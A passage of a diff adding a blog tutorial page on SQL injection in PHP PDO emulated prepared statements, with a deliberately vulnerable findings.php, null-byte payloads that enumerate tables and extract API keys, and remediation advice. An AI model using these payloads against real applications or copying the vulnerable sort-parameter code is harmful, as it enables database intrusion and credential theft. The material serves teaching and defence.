+(3, '192.168.1.11', 443, 'Critical', 9.8, 'RCE in Apache', 'Remote code execution possible', 1),
+(4, '192.168.1.12', 3306, 'Low', 3.1, 'MySQL Version Disclosure', 'Version visible in banner', 1);
+
+INSERT INTO scans VALUES
+(1, 'Internal Network Scan', '192.168.1.0/24', '2025-01-15 10:30:00');
+
+INSERT INTO api_keys VALUES
+(1, 'Production API', 'prod_api_a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5', 'admin'),
+(2, 'Scanner Integration', 'scanner_key_x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4', 'scanner_service');
+</code></pre>
+</details>
+<details><summary>View the vulnerable code</summary>    
+<pre><code>&lt;?php
+/**
+ * VulnScan Dashboard - Findings View
+ * File: findings.php
+ */
+
+$dsn = &quot;mysql:host=127.0.0.1;dbname=vulnscan&quot;;
+$pdo = new PDO($dsn, 'vulnscan_user', 'password123');
+
+// Get scan_id from user - uses placeholder (SAFE)
+$scan_id = $_GET['scan_id'] ?? 1;
+
+// Get sort column from user - inserted directly (VULNERABLE)
+$sort = $_GET['sort'] ?? 'severity';
+
+// Developer thinks escaping backticks is enough...
+$sort = str_replace('`', '``', $sort);
+
+$stmt = $pdo-&gt;prepare(&quot;SELECT `$sort` FROM findings WHERE scan_id = ?&quot;);
+$stmt-&gt;execute([$scan_id]);
+$findings = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
+
+echo &quot;&lt;h1&gt;Scan Findings&lt;/h1&gt;&quot;;
+echo &quot;&lt;table border='1'&gt;&quot;;
+foreach($findings as $finding) {
+    echo &quot;&lt;tr&gt;&quot;;
+    foreach($finding as $value) {
+        echo &quot;&lt;td&gt;&quot; . htmlspecialchars($value) . &quot;&lt;/td&gt;&quot;;
+    }
+    echo &quot;&lt;/tr&gt;&quot;;
+}
+echo &quot;&lt;/table&gt;&quot;;
+?&gt;
+</code></pre>
+</details>
+<p>The developer followed best practices:</p>
+<ul>
+<li>✔️ Used prepared statements</li>
+<li>✔️ Used placeholders for <code>scan_id</code></li>
+<li>✔️ Escaped backticks in the sort parameter</li>
+</ul>
+<p>But they couldn&rsquo;t use a placeholder for the column name. That&rsquo;s where we attack.</p>
+<h3 id="step-1-normal-request">Step 1: Normal Request<a hidden class="anchor" aria-hidden="true" href="#step-1-normal-request">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /findings.php?scan_id<span style="color:#ff7b72;font-weight:bold">=</span>1&amp;<span style="color:#79c0ff">sort</span><span style="color:#ff7b72;font-weight:bold">=</span>severity
+</span></span></code></pre></div><p>Returns findings sorted by severity. Everything works normally.</p>
+<p><strong>Step 2: Test the Parser Break</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /findings.php?scan_id<span style="color:#ff7b72;font-weight:bold">=</span>1&amp;<span style="color:#79c0ff">sort</span><span style="color:#ff7b72;font-weight:bold">=</span>?%00
+</span></span></code></pre></div><p>If you get an error about parameter count mismatch, the parser is broken. PDO is seeing our <code>?</code> as a real placeholder.</p>
+<h3 id="step-3-enumerate-tables">Step 3: Enumerate Tables<a hidden class="anchor" aria-hidden="true" href="#step-3-enumerate-tables">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /findings.php?scan_id<span style="color:#ff7b72;font-weight:bold">=</span>x<span style="color:#a5d6ff">`</span>+FROM+<span style="color:#ff7b72;font-weight:bold">(</span>SELECT+table_name+AS+<span style="color:#a5d6ff">`</span><span style="color:#f85149">&#39;</span>x<span style="color:#a5d6ff">`</span>+FROM+information_schema.tables+WHERE+table_schema<span style="color:#ff7b72;font-weight:bold">=</span>database<span style="color:#ff7b72;font-weight:bold">())</span>y;--+-&amp;<span style="color:#79c0ff">sort</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">\?</span>;--+-%00
+</span></span></code></pre></div><p>This reveals the tables: <code>findings</code>, <code>scans</code>, <code>api_keys</code>.</p>
+<h3 id="step-4-extract-api-keys">Step 4: Extract API keys<a hidden class="anchor" aria-hidden="true" href="#step-4-extract-api-keys">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /findings.php?scan_id<span style="color:#ff7b72;font-weight:bold">=</span>x<span style="color:#a5d6ff">`</span>+FROM+<span style="color:#ff7b72;font-weight:bold">(</span>SELECT+api_key+AS+<span style="color:#a5d6ff">`</span><span style="color:#f85149">&#39;</span>x<span style="color:#a5d6ff">`</span>+FROM+api_keys<span style="color:#ff7b72;font-weight:bold">)</span>y;--+-&amp;<span style="color:#79c0ff">sort</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">\?</span>;--+-%00
+</span></span></code></pre></div><p>Result:</p>
+<table>
+  <thead>
+      <tr>
+          <th><strong>api_key</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>sk_live_a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5</td>
+      </tr>
+      <tr>
+          <td>sk_prod_x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4</td>
+      </tr>
+  </tbody>
+</table>
+<p>We&rsquo;ve extracted sensitive API keys from a completely different table.</p>
+<h3 id="understanding-the-payload">Understanding the Payload<a hidden class="anchor" aria-hidden="true" href="#understanding-the-payload">#</a></h3>
+<p>Let&rsquo;s break down:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">scan_id</span><span style="color:#ff7b72;font-weight:bold">=</span>x+FROM+<span style="color:#ff7b72;font-weight:bold">(</span>SELECT+api_key+AS+<span style="color:#f85149">&#39;</span>x+FROM+api_keys<span style="color:#ff7b72;font-weight:bold">)</span>y;--+-<span style="color:#a5d6ff">`</span>
+</span></span></code></pre></div><table>
+  <thead>
+      <tr>
+          <th><strong>Part</strong></th>
+          <th><strong>Purpose</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>X</code></td>
+          <td>Dummy value</td>
+      </tr>
+      <tr>
+          <td><code>`</code></td>
+          <td>Closes the original backtick in the query</td>
+      </tr>
+      <tr>
+          <td><code>FROM (...)y</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>`SELECT api_key AS 'x`</code></td>
+          <td>Selects api_key and names it <code>'x</code></td>
+      </tr>
+      <tr>
+          <td><code>;</code></td>
+          <td>Ends the statement</td>
+      </tr>
+      <tr>
+          <td><code>-+-</code></td>
+          <td>Comments out the rest</td>
+      </tr>
+  </tbody>
+</table>
+<p>Why <code>'x</code> as the column name? PDO escapes single quotes by adding a backslash. So <code>'x</code> becomes <code>\'x</code>. The <code>\</code> in our sort parameter (<code>\?</code>) ensures the outer column name also becomes <code>\'x</code> - they match, and MySQL returns our data.</p>
+<h3 id="remediation---how-to-fix-it">Remediation - How to fix it<a hidden class="anchor" aria-hidden="true" href="#remediation---how-to-fix-it">#</a></h3>
+<p>Now that we understand the vulnerability, how do we prevent it?</p>
+<h3 id="option-1-disable-emulated-prepares">Option 1: Disable Emulated Prepares<a hidden class="anchor" aria-hidden="true" href="#option-1-disable-emulated-prepares">#</a></h3>
+<p>The simplest fix - tell PDO to use real prepared statements:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$pdo</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> PDO(<span style="color:#79c0ff">$dsn</span>, <span style="color:#79c0ff">$user</span>, <span style="color:#79c0ff">$pass</span>, [
+</span></span><span style="display:flex;"><span>    PDO<span style="color:#ff7b72;font-weight:bold">::</span>ATTR_EMULATE_PREPARES <span style="color:#ff7b72;font-weight:bold">=&gt;</span> <span style="color:#ff7b72">false</span>
+</span></span><span style="display:flex;"><span>]);
+</span></span></code></pre></div><p>With real prepared statements, the query structure is sent to MySQL first, then the parameters separately. PDO&rsquo;s parser is never involved, so the null byte trick doesn&rsquo;t work.</p>
+<h3 id="option-2-whitelist-allowed-values">Option 2: Whitelist Allowed Values<a hidden class="anchor" aria-hidden="true" href="#option-2-whitelist-allowed-values">#</a></h3>
+<p>Never trust user input for column names. Define exactly which columns are allowed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$allowed_sorts</span> <span style="color:#ff7b72;font-weight:bold">=</span> [<span style="color:#a5d6ff">&#39;hostname&#39;</span>, <span style="color:#a5d6ff">&#39;port&#39;</span>, <span style="color:#a5d6ff">&#39;severity&#39;</span>, <span style="color:#a5d6ff">&#39;cvss&#39;</span>, <span style="color:#a5d6ff">&#39;title&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$sort</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$_GET</span>[<span style="color:#a5d6ff">&#39;sort&#39;</span>] <span style="color:#ff7b72;font-weight:bold">??</span> <span style="color:#a5d6ff">&#39;severity&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">!</span>in_array(<span style="color:#79c0ff">$sort</span>, <span style="color:#79c0ff">$allowed_sorts</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">$sort</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;severity&#39;</span>; <span style="color:#8b949e;font-style:italic">// default fallback
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$stmt</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$pdo</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>prepare(<span style="color:#a5d6ff">&#34;SELECT * FROM findings WHERE scan_id = ? ORDER BY `</span><span style="color:#a5d6ff">$sort</span><span style="color:#a5d6ff">`&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$stmt</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>execute([<span style="color:#79c0ff">$scan_id</span>]);
+</span></span></code></pre></div><p>If the user sends anything not in the whitelist, it defaults to a safe value.</p>
+<h3 id="option-3-both-recommended">Option 3: Both (Recommended)<a hidden class="anchor" aria-hidden="true" href="#option-3-both-recommended">#</a></h3>
+<p>Defense in depth - use both protections:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$pdo</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> PDO(<span style="color:#79c0ff">$dsn</span>, <span style="color:#79c0ff">$user</span>, <span style="color:#79c0ff">$pass</span>, [
+</span></span><span style="display:flex;"><span>    PDO<span style="color:#ff7b72;font-weight:bold">::</span>ATTR_EMULATE_PREPARES <span style="color:#ff7b72;font-weight:bold">=&gt;</span> <span style="color:#ff7b72">false</span>
+</span></span><span style="display:flex;"><span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$allowed_sorts</span> <span style="color:#ff7b72;font-weight:bold">=</span> [<span style="color:#a5d6ff">&#39;hostname&#39;</span>, <span style="color:#a5d6ff">&#39;port&#39;</span>, <span style="color:#a5d6ff">&#39;severity&#39;</span>, <span style="color:#a5d6ff">&#39;cvss&#39;</span>, <span style="color:#a5d6ff">&#39;title&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$sort</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$_GET</span>[<span style="color:#a5d6ff">&#39;sort&#39;</span>] <span style="color:#ff7b72;font-weight:bold">??</span> <span style="color:#a5d6ff">&#39;severity&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">!</span>in_array(<span style="color:#79c0ff">$sort</span>, <span style="color:#79c0ff">$allowed_sorts</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">$sort</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;severity&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$stmt</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$pdo</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>prepare(<span style="color:#a5d6ff">&#34;SELECT * FROM findings WHERE scan_id = ? ORDER BY `</span><span style="color:#a5d6ff">$sort</span><span style="color:#a5d6ff">`&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$stmt</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>execute([<span style="color:#79c0ff">$scan_id</span>]);
+</span></span></code></pre></div><h3 id="what-not-to-do">What NOT to Do<a hidden class="anchor" aria-hidden="true" href="#what-not-to-do">#</a></h3>
+<p>These approaches are <strong>not enough</strong>:</p>
+<p>✖️ <strong>Escaping backticks only</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$sort</span> <span style="color:#ff7b72;font-weight:bold">=</span> str_replace(<span style="color:#a5d6ff">&#39;`&#39;</span>, <span style="color:#a5d6ff">&#39;``&#39;</span>, <span style="color:#79c0ff">$_GET</span>[<span style="color:#a5d6ff">&#39;sort&#39;</span>]);
+</span></span></code></pre></div><p>Doesn&rsquo;t prevent the null byte parser break.</p>
+<p>✖️ <strong>Filtering null bytes only</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$sort</span> <span style="color:#ff7b72;font-weight:bold">=</span> str_replace(<span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\0</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#a5d6ff">&#39;&#39;</span>, <span style="color:#79c0ff">$_GET</span>[<span style="color:#a5d6ff">&#39;sort&#39;</span>]);
+</span></span></code></pre></div><p>Other parser bugs may exist. Defense in depth is better.</p>
+<p>✖️ <strong>Relying on WAFs</strong>
+Web Application Firewalls might miss encoded payloads like <code>%00</code>.</p>
+<h3 id="conclusion--references">Conclusion &amp; References<a hidden class="anchor" aria-hidden="true" href="#conclusion--references">#</a></h3>
+<p>Prepared statements are secure - but only when used correctly.</p>
+<p>The key takeaways from this technique:</p>
+<ol>
+<li><strong>Prepared statements can&rsquo;t protect everything</strong> - Column names, table names, and ORDER BY clauses cannot use placeholders. Developers are forced to insert these directly.</li>
+<li><strong>PDO&rsquo;s emulated prepares have a parser</strong> - This parser can be broken with null bytes, causing PDO to misidentify placeholders.</li>
+<li><strong>&ldquo;Safe&rdquo; parameters can become injection points</strong> - Through the swap technique, a properly bound parameter value ends up in a vulnerable position.</li>
+<li><strong>Defense in depth matters</strong> - Disable emulated prepares AND whitelist allowed values. Never rely on a single protection.</li>
+</ol>
+<p>When testing PHP applications, look for:</p>
+<ul>
+<li>Sorting functionality (ORDER BY)</li>
+<li>Dynamic column selection</li>
+<li>Table name parameters</li>
+<li>Any place where identifiers come from user input</li>
+</ul>
+<p>Test with payloads like <code>\?;-- %00</code> and watch for unexpected behavior.</p>
+<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
+<ul>
+<li><a href="https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/">Original research on this technique by hashkitten (DownUnderCTF 2024)</a></li>
+<li><a href="https://www.php.net/manual/en/book.pdo.php">PHP PDO Documentation</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP SQL Injection Prevention Cheat Sheet</a></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/net0.github.io/tags/sql-injection/">Sql-Injection</a></li>
+      <li><a href="http://localhost:1313/net0.github.io/tags/php/">Php</a></li>
+      <li><a href="http://localhost:1313/net0.github.io/tags/pdo/">Pdo</a></li>
+      <li><a href="http://localhost:1313/net0.github.io/tags/web-security/">Web-Security</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/net0.github.io/">Net0</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
